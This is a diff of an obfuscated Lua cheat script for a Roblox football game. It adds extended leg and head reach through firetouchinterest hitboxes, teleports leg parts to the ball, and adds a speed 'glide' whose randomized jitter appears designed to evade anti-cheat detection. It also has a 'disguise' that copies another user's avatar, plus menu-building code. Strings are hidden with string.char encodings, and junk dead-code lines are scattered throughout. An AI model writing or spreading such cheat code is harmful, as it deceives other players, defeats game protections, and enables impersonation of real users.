+local function cloneLegPart(orig,chr)
+    orig.Transparency=1; orig.Massless=true; orig.CanCollide=false; table.insert(legOrigParts,orig)
+    local fake=orig:Clone(); fake.Anchored=false; fake.Transparency=0; fake.CanCollide=false; fake.Massless=true; fake.CFrame=orig.CFrame
+    for _,v in ipairs(fake:GetChildren()) do if v:IsA((function() return string.char(0x4d, 0x6f, 0x74, 0x6f, 0x72, 0x36, 0x44) end)()) or v:IsA((function() return string.char(87, 101, 108, 100) end)()) or v:IsA((function() local t=[87, 101, 108, 100, 67, 111, 110, 115, 116, 114, 97, 105, 110, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) then v:Destroy() end end
+if false then local _1b278e_=9018 end
+    local mark=Instance.new((function() return string.char(0x42, 0x6f, 0x6f, 0x6c, 0x56, 0x61, 0x6c, 0x75, 0x65) end)()); mark.Name=(function() return string.char(95, 76, 101, 103, 82, 101, 97, 99, 104, 70, 97, 107, 101) end)(); mark.Parent=fake; fake.Parent=chr; table.insert(legFakeParts,fake)
+    local origMotor=findMotor(chr,orig)
+    if origMotor then
+        local motor=Instance.new((function() local t=[77, 111, 116, 111, 114, 54, 68] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); motor.Name=(function() return string.char(0x46, 0x61, 0x6b, 0x65, 0x4c, 0x65, 0x67, 0x4d, 0x6f, 0x74, 0x6f, 0x72) end)(); motor.C0=origMotor.C0; motor.C1=origMotor.C1
+        motor.Part0=origMotor.Part0; motor.Part1=fake; motor.Parent=chr; table.insert(legFakeParts,motor)
+do local __abd2e8_=nil end
+    end
+[==[ fenag2DtD ]==]
+    return fake
+if false then local uhcwgn_f9a9=3981 end
+end
+
+local function setupLegReach(chr)
+    cleanupLegReach(); task.wait(0.15)
+    local isR6=chr:FindFirstChild((function() return string.char(82, 105, 103, 104, 116, 32, 76, 101, 103) end)())~=nil
+    if isR6 then
+        local rLeg=chr:WaitForChild((function() local t=[82, 105, 103, 104, 116, 32, 76, 101, 103] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),5); if not rLeg then return end; cloneLegPart(rLeg,chr)
+if false then local kisiNs3=3424 end
+    else
+        local rul=chr:WaitForChild((function() return string.char(0x52, 0x69, 0x67, 0x68, 0x74, 0x55, 0x70, 0x70, 0x65, 0x72, 0x4c, 0x65, 0x67) end)(),5); local rll=chr:WaitForChild((function() return string.char(82, 105, 103, 104, 116, 76, 111, 119, 101, 114, 76, 101, 103) end)(),5)
+        if not rul or not rll then return end
+[==[ _35d01e_ ]==]
+        local fakeUpper=cloneLegPart(rul,chr); local fakeLower=cloneLegPart(rll,chr)
+[==[ ozkiuy_1781 ]==]
+        for i=#legFakeParts,1,-1 do local v=legFakeParts[i]; if v and v:IsA((function() local t=[77, 111, 116, 111, 114, 54, 68] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) and v.Part1==fakeLower then v.Part0=fakeUpper; break end end
+    end
+end
+
+local function startLegReachLoop()
+[==[ _eddd59_ ]==]
+    if legReachConn then legReachConn:Disconnect() end
+    legReachConn=RunService.RenderStepped:Connect(function()
+        if not config.LegReach then return end
+        local chr=LocalPlayer.Character; if not chr then return end
+        if not chr:FindFirstChild((function() return string.char(0x48, 0x75, 0x6d, 0x61, 0x6e, 0x6f, 0x69, 0x64, 0x52, 0x6f, 0x6f, 0x74, 0x50, 0x61, 0x72, 0x74) end)()) then return end
+[==[ wihihab8pj ]==]
+        local curTPS=(tps and tps.Parent and tps) or workspace.TPSSystem:FindFirstChild((function() return string.char(84, 80, 83) end)())
+        if not curTPS then return end
+        local touching=false
+if false then local gaqedPN=5338 end
+        if legVisualPart and legVisualPart.Parent then
+do local _blow_dd1e=nil end
+            local lvPos=legVisualPart.Position; local tpsPos=curTPS.Position; local diff=lvPos-tpsPos
+if false then local wrjiq_b176=5668 end
+            local lvShape=config.LegVisualShape; local tpsShape=(curTPS.Shape==Enum.PartType.Ball) and (function() local t=[66, 97, 108, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)() or (function() return string.char(0x42, 0x6c, 0x6f, 0x63, 0x6b) end)()
+            if lvShape==(function() return string.char(66, 97, 108, 108) end)() and tpsShape==(function() local t=[66, 97, 108, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)() then
+                touching=diff.Magnitude<=(legVisualPart.Size.X/2+curTPS.Size.X/2)
+            elseif lvShape==(function() return string.char(0x42, 0x61, 0x6c, 0x6c) end)() then
+                local half=curTPS.Size/2; local loc=curTPS.CFrame:Inverse()*lvPos
+[==[ _ec7efa_ ]==]
+                local close=Vector3.new(math.clamp(loc.X,-half.X,half.X),math.clamp(loc.Y,-half.Y,half.Y),math.clamp(loc.Z,-half.Z,half.Z))
+                touching=(loc-close).Magnitude<=legVisualPart.Size.X/2
+if false then local ytkqdvfg_88b9=7938 end
+            elseif tpsShape==(function() return string.char(66, 97, 108, 108) end)() then
+if false then local _5e1479_=642 end
+                local half=legVisualPart.Size/2; local loc=legVisualPart.CFrame:Inverse()*tpsPos
+                local close=Vector3.new(math.clamp(loc.X,-half.X,half.X),math.clamp(loc.Y,-half.Y,half.Y),math.clamp(loc.Z,-half.Z,half.Z))
+                touching=(loc-close).Magnitude<=curTPS.Size.X/2
+            else
+                local hLV=legVisualPart.Size/2; local hTPS=curTPS.Size/2
+                touching=math.abs(diff.X)<=(hLV.X+hTPS.X) and math.abs(diff.Y)<=(hLV.Y+hTPS.Y) and math.abs(diff.Z)<=(hLV.Z+hTPS.Z)
+            end
+        end
+        if touching then for _,p in ipairs(legOrigParts) do if p and p.Parent then p.Position=curTPS.Position end end end
+    end)
+end
+
+local function disconnect(conn) if conn then conn:Disconnect() end; return nil end
+
+do local __c71ac4_=nil end
+local function makeBox(size,color,transparency,name)
+    local p=Instance.new((function() local t=[80, 97, 114, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); p.Size=size; p.Transparency=transparency; p.Anchored=true
+    p.CanCollide=false; p.CastShadow=false; p.Color=color; p.Material=Enum.Material.Neon
+    p.Name=name or (function() return string.char(0x48, 0x69, 0x74, 0x62, 0x6f, 0x78, 0x50, 0x61, 0x72, 0x74) end)(); p.Parent=Workspace; return p
+end
+
+local function getLimb()
+    local foot=Lighting:FindFirstChild(LocalPlayer.Name); foot=foot and foot:FindFirstChild((function() return string.char(80, 114, 101, 102, 101, 114, 114, 101, 100, 70, 111, 111, 116) end)())
+if false then local nfwg_5fcd=7630 end
+    return (not foot or foot.Value==1) and rightLeg or leftLeg
+end
+
+if false then local boci1wpH=9338 end
+local function getBall() return (tps and tps.Parent and tps) or (Workspace:FindFirstChild((function() local t=[84, 80, 83, 83, 121, 115, 116, 101, 109] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) and Workspace.TPSSystem:FindFirstChild((function() return string.char(0x54, 0x50, 0x53) end)())) end
+
+local legBoxEnabled=false; local legBoxSize=Vector3.new(4,4,4); local legBoxTransparency=0.5
+local legBox=nil; local legBoxConn=nil
+
+if false then local qefamovoiHE49=9010 end
+local function rebuildLegBox() if legBox then legBox:Destroy() end; legBox=makeBox(legBoxSize,CFG.C.Accent,legBoxTransparency,(function() return string.char(76, 101, 103, 82, 101, 97, 99, 104, 66, 111, 120) end)()) end
+
+local function startLegXYZ()
+do local _mjtz_0209=nil end
+    legBoxConn=disconnect(legBoxConn); rebuildLegBox()
+do local _vqkav_bcbc=nil end
+    legBoxConn=RunService.PreSimulation:Connect(function()
+        if not (root and legBox) then return end; local ball=getBall(); if not ball then return end
+        legBox.CFrame=root.CFrame*CFrame.new(0,-2,0)
+        local rel=legBox.CFrame:PointToObjectSpace(ball.Position); local half=legBox.Size*0.5
+        if math.abs(rel.X)<=half.X and math.abs(rel.Y)<=half.Y and math.abs(rel.Z)<=half.Z then
+            local limb=getLimb(); if limb then firetouchinterest(limb,ball,0); firetouchinterest(limb,ball,1) end
+        end
+    end)
+end
+
+local function stopLegXYZ() legBoxConn=disconnect(legBoxConn); if legBox then legBox:Destroy(); legBox=nil end end
+
+local headEnabled=false; local headSize=Vector3.new(2,3,2); local headTransp=0.5
+[==[ yelodeteSoaOt ]==]
+local headOffset=Vector3.new(0,headSize.Y/2.5,0); local headBox=nil; local headConn=nil
+
+local function rebuildHeadBox() if headBox then headBox:Destroy() end; headBox=makeBox(headSize,CFG.C.Accent,headTransp,(function() local t=[72, 101, 97, 100, 82, 101, 97, 99, 104, 66, 111, 120] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) end
+
+local function startHead()
+    headConn=disconnect(headConn); rebuildHeadBox()
+[==[ nymnyuqa_4d67 ]==]
+    headConn=RunService.PreSimulation:Connect(function()
+[==[ jagcnp_aba3 ]==]
+        if not (head and headBox) then return end; local ball=getBall(); if not ball then return end
+        headBox.CFrame=head.CFrame*CFrame.new(headOffset)
+if false then local binasikah3jXM=9760 end
+        local rel=headBox.CFrame:PointToObjectSpace(ball.Position); local half=headBox.Size*0.5
+        if math.abs(rel.X)<=half.X and math.abs(rel.Y)<=half.Y and math.abs(rel.Z)<=half.Z then
+            firetouchinterest(head,ball,0); firetouchinterest(head,ball,1)
+if false then local bjdzw_c472=3799 end
+        end
+if false then local lhvci_502e=5830 end
+    end)
+end
+
+do local __8e90c_=nil end
+local function stopHead() headConn=disconnect(headConn); if headBox then headBox:Destroy(); headBox=nil end end
+
+[==[ gebede ]==]
+local distEnabled=false; local distReach=1; local distConn=nil
+
+[==[ _5064d9_ ]==]
+local function restartDistConn()
+if false then local sacuuNC=9720 end
+    distConn=disconnect(distConn); if not distEnabled then return end
+    distConn=RunService.PreSimulation:Connect(function()
+[==[ gisuzamC2Hp ]==]
+        local ball=getBall(); if not (root and ball) then return end
+        if (root.Position-ball.Position).Magnitude<=distReach then
+            local limb=getLimb(); if limb then firetouchinterest(limb,ball,0); firetouchinterest(limb,ball,1) end
+[==[ wituvP ]==]
+        end
+    end)
+end
+
+if false then local _dcf51f_=5893 end
+local tpsR,tpsG,tpsB=255,255,255
+local function updateBallColor() if tps then tps.Color=Color3.fromRGB(tpsR,tpsG,tpsB) end end
+
+local noiseOffset=0; local glideEnabled=false; local glideStrength=4.2; local glideConn=nil
+local speedHistory={}; local frameCount=0
+
+[==[ teyofureDG ]==]
+local function getAdaptiveSpeed(base,dt)
+    frameCount=frameCount+1; local na=math.min(frameCount*0.1,1)
+    local ps=1+math.sin(os.clock()*0.7)*0.15; local pl=math.random(1,20)==1 and 0 or 1
+if false then local _63eec3_=8961 end
+    table.insert(speedHistory,base*na*ps*pl); if #speedHistory>10 then table.remove(speedHistory,1) end
+    local avg=0; for _,v in ipairs(speedHistory) do avg=avg+v end
+do local _xbmmd_a1a1=nil end
+    return (avg/#speedHistory)*(0.85+math.random()*0.3)
+[==[ eziwgt_6e4e ]==]
+end
+
+local function restartGlide()
+do local _hahipuho0Yca=nil end
+    glideConn=disconnect(glideConn); frameCount=0; speedHistory={}
+    if not glideEnabled then return end
+    glideConn=RunService.PreSimulation:Connect(function(dt)
+        if not (root and human) then return end
+        if human.MoveDirection.Magnitude==0 then frameCount=0; speedHistory={}; return end
+        noiseOffset=noiseOffset+dt
+        local n1=math.noise(noiseOffset*1.3,0.5)*0.25; local n2=math.noise(0.5,noiseOffset*2.1)*0.2; local n3=math.noise(noiseOffset*0.7,noiseOffset*1.1)*0.15
+        local spd=getAdaptiveSpeed(glideStrength,dt); local md=human.MoveDirection
+        root.CFrame=root.CFrame+(md*spd+Vector3.new(n1+n2,0,n2+n3))*dt
+if false then local _9d80ad_=7701 end
+        if math.random(1,12)==1 then root.CFrame=root.CFrame-(md*(0.02+math.random()*0.06)) end
+        root.CFrame=root.CFrame+Vector3.new(0,math.sin(noiseOffset*8)*0.01,0)
+    end)
+end
+
+local jpEnabled=false; local jpPower=50
+
+local disguiseActive=false; local disguiseUser=""
+
+local function removeOldAvatar(chr)
+[==[ _e0d6e_ ]==]
+    for _,v in ipairs(chr:GetChildren()) do
+        if v:IsA((function() return string.char(0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x6f, 0x72, 0x79) end)()) or v:IsA((function() return string.char(83, 104, 105, 114, 116) end)()) or v:IsA((function() local t=[80, 97, 110, 116, 115] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) or v:IsA((function() return string.char(0x42, 0x6f, 0x64, 0x79, 0x43, 0x6f, 0x6c, 0x6f, 0x72, 0x73) end)()) or v:IsA((function() return string.char(83, 104, 105, 114, 116, 71, 114, 97, 112, 104, 105, 99) end)()) then v:Destroy() end
+    end
+    local hum=chr:FindFirstChildOfClass((function() local t=[72, 117, 109, 97, 110, 111, 105, 100] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+    if hum then hum:ApplyDescriptionClientServer(Instance.new((function() return string.char(0x48, 0x75, 0x6d, 0x61, 0x6e, 0x6f, 0x69, 0x64, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6f, 0x6e) end)())) end
+end
+
+local function applyDisguise(chr)
+[==[ bidaxe8QTw ]==]
+    if not chr or disguiseUser=="" then return end
+[==[ clcexn_84a6 ]==]
+    if not chr:FindFirstChildOfClass((function() return string.char(72, 117, 109, 97, 110, 111, 105, 100) end)()) then task.delay(0.5,function() applyDisguise(chr) end); return end
+    removeOldAvatar(chr)
+    local ok=pcall(function()
+        local uid=Players:GetUserIdFromNameAsync(disguiseUser)
+        local desc=Players:GetHumanoidDescriptionFromUserId(uid)
+if false then local _e0a6ae_=5690 end
+        chr:FindFirstChildOfClass((function() local t=[72, 117, 109, 97, 110, 111, 105, 100] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()):ApplyDescriptionClientServer(desc)
+if false then local _33f5af_=8475 end
+    end)
+    if not ok then task.delay(1,function() applyDisguise(chr) end) end
+if false then local qshadokh_43ec=7687 end
+end
+
+do local _hbwvx_c7b9=nil end
+local antiAfkState=false
+
+LocalPlayer.CharacterAdded:Connect(function(c)
+    char=c; root=c:WaitForChild((function() return string.char(0x48, 0x75, 0x6d, 0x61, 0x6e, 0x6f, 0x69, 0x64, 0x52, 0x6f, 0x6f, 0x74, 0x50, 0x61, 0x72, 0x74) end)()); human=c:WaitForChild((function() return string.char(72, 117, 109, 97, 110, 111, 105, 100) end)()); head=c:WaitForChild((function() local t=[72, 101, 97, 100] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+if false then local _d21157_=5320 end
+    task.wait(0.1); rightLeg=c:FindFirstChild((function() return string.char(0x52, 0x69, 0x67, 0x68, 0x74, 0x20, 0x4c, 0x65, 0x67) end)()) or c:FindFirstChild((function() return string.char(82, 105, 103, 104, 116, 76, 111, 119, 101, 114, 76, 101, 103) end)()); leftLeg=c:FindFirstChild((function() local t=[76, 101, 102, 116, 32, 76, 101, 103] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()) or c:FindFirstChild((function() return string.char(0x4c, 0x65, 0x66, 0x74, 0x4c, 0x6f, 0x77, 0x65, 0x72, 0x4c, 0x65, 0x67) end)())
+do local _tufe80=nil end
+    task.wait(0.5)
+    if config.LegReach then setupLegReach(c); startLegReachLoop(); createLegVisualPart() end
+    if jpEnabled and human then human.JumpPower=jpPower end
+    if disguiseActive then c:WaitForChild((function() return string.char(72, 117, 109, 97, 110, 111, 105, 100) end)()); task.wait(0.2); applyDisguise(c) end
+if false then local zvcwbwyt_fa14=1361 end
+end)
+
+
+local function tw(obj,props,t,sty,dir)
+    TweenService:Create(obj,TweenInfo.new(t or .25,sty or Enum.EasingStyle.Quart,dir or Enum.EasingDirection.Out),props):Play()
+end
+
+local function corner(p,r) 
+if false then local ejtni_3cc2=298 end
+    local c=Instance.new((function() local t=[85, 73, 67, 111, 114, 110, 101, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+    c.CornerRadius=UDim.new(0,r or (isMobile and 12 or 10)); 
+    c.Parent=p; 
+[==[ _77abfa_ ]==]
+    return c 
+end
+
+local function stroke(p,col,th,tr) 
+if false then local _70493e_=3997 end
+    local s=Instance.new((function() return string.char(0x55, 0x49, 0x53, 0x74, 0x72, 0x6f, 0x6b, 0x65) end)()); 
+    s.Color=col or CFG.C.Border; 
+    s.Thickness=th or 1; 
+    s.Transparency=tr or .72; 
+    s.Parent=p; 
+    return s 
+if false then local pxipeso_9bfb=2590 end
+end
+
+[==[ jstix_4ede ]==]
+local function frame(props) 
+    local f=Instance.new((function() return string.char(70, 114, 97, 109, 101) end)()); 
+    for k,v in pairs(props) do f[k]=v end; 
+    return f 
+end
+
+local function label(props) 
+    local l=Instance.new((function() local t=[84, 101, 120, 116, 76, 97, 98, 101, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+    for k,v in pairs(props) do l[k]=v end; 
+    return l 
+end
+
+local function padding(p,l2,r,t,b)
+    local u=Instance.new((function() return string.char(0x55, 0x49, 0x50, 0x61, 0x64, 0x64, 0x69, 0x6e, 0x67) end)()); 
+    u.PaddingLeft=UDim.new(0,l2 or (isMobile and 12 or 0)); 
+    u.PaddingRight=UDim.new(0,r or (isMobile and 12 or 0)); 
+[==[ _97f293_ ]==]
+    u.PaddingTop=UDim.new(0,t or (isMobile and 10 or 0)); 
+    u.PaddingBottom=UDim.new(0,b or (isMobile and 10 or 0)); 
+[==[ rsjemya_0a3c ]==]
+    u.Parent=p; 
+    return u
+end
+
+local function listLayout(p,dir,pad,align)
+    local ul=Instance.new((function() return string.char(85, 73, 76, 105, 115, 116, 76, 97, 121, 111, 117, 116) end)()); 
+    ul.FillDirection=dir or Enum.FillDirection.Vertical; 
+    ul.Padding=UDim.new(0,pad or (isMobile and 16 or 0)); 
+    ul.SortOrder=Enum.SortOrder.LayoutOrder; 
+    ul.HorizontalAlignment=align or Enum.HorizontalAlignment.Left; 
+    ul.Parent=p; 
+    return ul
+do local _yjaie_d15c=nil end
+end
+
+do local __697d21_=nil end
+local function cardGlow(card,col)
+do local _huxx_71d3=nil end
+    local gs=Instance.new((function() local t=[85, 73, 83, 116, 114, 111, 107, 101] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+    gs.Color=col or CFG.C.Accent; 
+    gs.Thickness=isMobile and 2 or 1.5; 
+    gs.Transparency=0.82; 
+do local _yomakarO=nil end
+    gs.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; 
+    gs.Parent=card; 
+if false then local kikxb_5c1b=466 end
+    return gs
+end
+
+local function iconReach(p)
+do local _ozdmcpf_fc41=nil end
+    local col=CFG.C.SubText
+    frame({Size=UDim2.new(0,14,0,2),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,0,.5,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p})
+[==[ _386ad9_ ]==]
+    frame({Size=UDim2.new(0,2,0,14),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,0,.5,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p})
+    local dot=frame({Size=UDim2.new(0,4,0,4),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,0,.5,0),BackgroundColor3=CFG.C.Sidebar,BorderSizePixel=0,Parent=p}); corner(dot,2)
+do local _eeijqwq_97c2=nil end
+end
+
+local function iconVisual(p)
+    local col=CFG.C.SubText
+    local ring=frame({Size=UDim2.new(0,16,0,10),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,0,.5,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p}); corner(ring,5)
+do local _bkdvu_fd7d=nil end
+    local inn=frame({Size=UDim2.new(0,8,0,6),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,0,.5,0),BackgroundColor3=CFG.C.Sidebar,BorderSizePixel=0,Parent=p}); corner(inn,3)
+    local dot=frame({Size=UDim2.new(0,4,0,4),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,0,.5,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p}); corner(dot,2)
+end
+
+local function iconLegVis(p)
+    local col=CFG.C.SubText
+[==[ uoujkj_9de5 ]==]
+    local d1=frame({Size=UDim2.new(0,7,0,9),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.35,0,.42,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p}); corner(d1,4)
+    local d2=frame({Size=UDim2.new(0,7,0,9),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.65,0,.62,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p}); corner(d2,4)
+end
+
+local function iconMove(p)
+    local col=CFG.C.SubText
+do local __f68e36_=nil end
+    frame({Size=UDim2.new(0,2,0,10),AnchorPoint=Vector2.new(.5,1),Position=UDim2.new(.5,0,1,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p})
+do local _yenigoiZ5Dq=nil end
+    frame({Size=UDim2.new(0,8,0,2),AnchorPoint=Vector2.new(1,.5),Position=UDim2.new(.5,0,0,6),BackgroundColor3=col,BorderSizePixel=0,Parent=p})
+    frame({Size=UDim2.new(0,8,0,2),AnchorPoint=Vector2.new(0,.5),Position=UDim2.new(.5,0,0,6),BackgroundColor3=col,BorderSizePixel=0,Parent=p})
+end
+
+[==[ _94f95_ ]==]
+local function iconAvatar(p)
+    local col=CFG.C.SubText
+    local h=frame({Size=UDim2.new(0,8,0,8),AnchorPoint=Vector2.new(.5,0),Position=UDim2.new(.5,0,0,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p}); corner(h,4)
+do local _wacjusvs_3367=nil end
+    local b=frame({Size=UDim2.new(0,13,0,8),AnchorPoint=Vector2.new(.5,1),Position=UDim2.new(.5,0,1,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p}); corner(b,4)
+end
+
+do local _tusofe95JKi=nil end
+local function iconMisc(p)
+    local col=CFG.C.SubText; local sz=6; local gap=2
+    for row=0,1 do for col2=0,1 do
+        local f=frame({Size=UDim2.new(0,sz,0,sz),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,(col2-.5)*(sz+gap),.5,(row-.5)*(sz+gap)),BackgroundColor3=col,BorderSizePixel=0,Parent=p}); corner(f,2)
+do local _kaewvfl_d961=nil end
+    end end
+end
+
+local function iconAbout(p)
+    local col=CFG.C.SubText
+    local c=frame({Size=UDim2.new(0,17,0,17),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,0,.5,0),BackgroundColor3=col,BorderSizePixel=0,Parent=p}); corner(c,9)
+    label({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text=(function() return string.char(0x69) end)(),TextColor3=CFG.C.Sidebar,Font=F.Bold,TextSize=12,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Parent=c})
+end
+
+local function iconMenu(p)
+    for i=0,2 do frame({Size=UDim2.new(0,14,0,2),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(.5,0,.5,(i-1)*5),BackgroundColor3=CFG.C.SubText,BorderSizePixel=0,Parent=p}) end
+end
+
+local ICON_FNS={iconReach,iconVisual,iconLegVis,iconMove,iconAvatar,iconMisc,iconAbout}
+
+local function makeScrollPage(parent)
+[==[ yakoInI3 ]==]
+    local sf=Instance.new((function() return string.char(83, 99, 114, 111, 108, 108, 105, 110, 103, 70, 114, 97, 109, 101) end)()); 
+[==[ tuyezozqfqd ]==]
+    sf.Size=UDim2.new(1,0,1,0); 
+if false then local _baadf2_=2874 end
+    sf.BackgroundTransparency=1; 
+    sf.BorderSizePixel=0
+    sf.ScrollBarThickness=isMobile and 6 or 3; 
+if false then local _4db59a_=8629 end
+    sf.ScrollBarImageColor3=CFG.C.Accent; 
+if false then local payzcans_5996=6289 end
+    sf.ScrollBarImageTransparency=0.65
+    sf.CanvasSize=UDim2.new(0,0,0,0); 
+    sf.AutomaticCanvasSize=Enum.AutomaticSize.Y; 
+if false then local _77b942_=5522 end
+    sf.ClipsDescendants=true; 
+[==[ jkvrmci_bb01 ]==]
+    sf.Parent=parent
+do local _ciqexo12yZ6=nil end
+    padding(sf,16,16,14,18); 
+    listLayout(sf,nil,isMobile and 16 or 10); 
+    return sf
+end
+
+local function makeSection(parent,title,order)
+    local wrap=frame({Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,LayoutOrder=order or 1,Parent=parent}); 
+[==[ qaxuzajugWiee ]==]
+    listLayout(wrap,nil,0)
+if false then local dvgduxr_501a=3458 end
+    label({Size=UDim2.new(1,0,0,isMobile and 28 or 22),BackgroundTransparency=1,Text=string.upper(title),TextColor3=CFG.C.SubText,Font=F.Bold,TextSize=isMobile and 11 or 9,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=1,Parent=wrap})
+do local __504948_=nil end
+    frame({Size=UDim2.new(1,0,0,1),BackgroundColor3=CFG.C.Border,BackgroundTransparency=0.6,BorderSizePixel=0,LayoutOrder=2,Parent=wrap})
+    local card=frame({Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundColor3=CFG.C.Card,BackgroundTransparency=0.25,BorderSizePixel=0,LayoutOrder=3,Parent=wrap})
+    corner(card,isMobile and 14 or 10); 
+do local __7682a3_=nil end
+    cardGlow(card,CFG.C.Accent); 
+    listLayout(card,nil,isMobile and 14 or 0); 
+    return card
+do local _zisaceluizwA1=nil end
+end
+
+do local _lobuSbK=nil end
+local function makeRow(parent,h,order)
+    local r=frame({Size=UDim2.new(1,0,0,h or (isMobile and 56 or 46)),BackgroundTransparency=1,LayoutOrder=order or 1,Parent=parent}); 
+if false then local _512ece_=5681 end
+    padding(r,14,14,0,0); 
+    return r
+[==[ _cd4dbf_ ]==]
+end
+
+local function rowDivider(parent,order)
+    frame({Size=UDim2.new(1,-28,0,1),AnchorPoint=Vector2.new(.5,0),Position=UDim2.new(.5,0,0,0),BackgroundColor3=CFG.C.Border,BackgroundTransparency=0.72,BorderSizePixel=0,LayoutOrder=order,Parent=parent})
+end
+
+local function makeToggle(parent,lbl,sublbl,default,order,callback)
+    local row=makeRow(parent,isMobile and 62 or 52,order); 
+do local __833d53_=nil end
+    local on=default or false
+if false then local huvvyf_f549=2763 end
+    label({Size=UDim2.new(1,-(isMobile and 70 or 58),0,isMobile and 24 or 20),Position=UDim2.new(0,0,0,isMobile and 10 or 8),BackgroundTransparency=1,Text=lbl,TextColor3=CFG.C.Text,Font=F.Body,TextSize=isMobile and 15 or 13,TextXAlignment=Enum.TextXAlignment.Left,Parent=row})
+[==[ _f7141d_ ]==]
+    if sublbl then 
+        label({Size=UDim2.new(1,-(isMobile and 70 or 58),0,isMobile and 18 or 16),Position=UDim2.new(0,0,isMobile and 28 or 28),BackgroundTransparency=1,Text=sublbl,TextColor3=CFG.C.SubText,Font=F.Body,TextSize=isMobile and 12 or 11,TextXAlignment=Enum.TextXAlignment.Left,Parent=row}) 
+    end
+    local track=frame({Size=UDim2.new(0,isMobile and 50 or 40,0,isMobile and 28 or 22),AnchorPoint=Vector2.new(1,.5),Position=UDim2.new(1,0,.5,0),BackgroundColor3=on and CFG.C.Accent or CFG.C.Border,BorderSizePixel=0,Parent=row}); 
+    corner(track,isMobile and 14 or 11)
+if false then local qdeeop_2d59=3285 end
+    local thumb=frame({Size=UDim2.new(0,isMobile and 22 or 16,0,isMobile and 22 or 16),AnchorPoint=Vector2.new(0,.5),Position=UDim2.new(0,on and (isMobile and 26 or 20) or 3,.5,0),BackgroundColor3=CFG.C.Text,BorderSizePixel=0,Parent=track}); 
+    corner(thumb,isMobile and 11 or 9)
+    local btn=Instance.new((function() local t=[84, 101, 120, 116, 66, 117, 116, 116, 111, 110] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+[==[ _797799_ ]==]
+    btn.Size=UDim2.new(1,0,1,0); 
+[==[ _e6e1c2_ ]==]
+    btn.BackgroundTransparency=1; 
+    btn.Text=""; 
+    btn.AutoButtonColor=false; 
+    btn.Parent=row
+    btn.MouseButton1Click:Connect(function()
+        on=not on; 
+if false then local smkrkpi_7e16=7442 end
+        tw(track,{BackgroundColor3=on and CFG.C.Accent or CFG.C.Border},.2)
+if false then local mijihesiwvjCv=3460 end
+        tw(thumb,{Position=UDim2.new(0,on and (isMobile and 26 or 20) or 3,.5,0)},.22,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
+[==[ _eef040_ ]==]
+        if callback then callback(on) end
+[==[ _ca4f01_ ]==]
+    end)
+    return function() return on end
+end
+
+[==[ _be0116_ ]==]
+local function makeSlider(parent,lbl,min,max,default,order,callback,step)
+    local row=makeRow(parent,isMobile and 74 or 60,order); 
+    local val=default or min
+    local function roundVal(raw) if step then return math.round(raw/step)*step else return math.round(raw) end end
+    local function fmtVal(v) return tostring(v) end
+do local _yunkzlb_fb59=nil end
+    local topR=frame({Size=UDim2.new(1,0,0,isMobile and 26 or 20),BackgroundTransparency=1,Parent=row})
+[==[ polecoruZygD ]==]
+    label({Size=UDim2.new(.7,0,1,0),BackgroundTransparency=1,Text=lbl,TextColor3=CFG.C.Text,Font=F.Body,TextSize=isMobile and 15 or 13,TextXAlignment=Enum.TextXAlignment.Left,Parent=topR})
+    local valLbl=label({Size=UDim2.new(.3,0,1,0),AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,0,0,0),BackgroundTransparency=1,Text=fmtVal(val),TextColor3=CFG.C.Accent,Font=F.Mono,TextSize=isMobile and 15 or 13,TextXAlignment=Enum.TextXAlignment.Right,Parent=topR})
+do local _xaqtec_04df=nil end
+    local trackBg=frame({Size=UDim2.new(1,0,0,isMobile and 8 or 5),Position=UDim2.new(0,0,isMobile and 40 or 32),BackgroundColor3=CFG.C.Input,BackgroundTransparency=0.15,BorderSizePixel=0,Parent=row}); 
+    corner(trackBg,isMobile and 4 or 3)
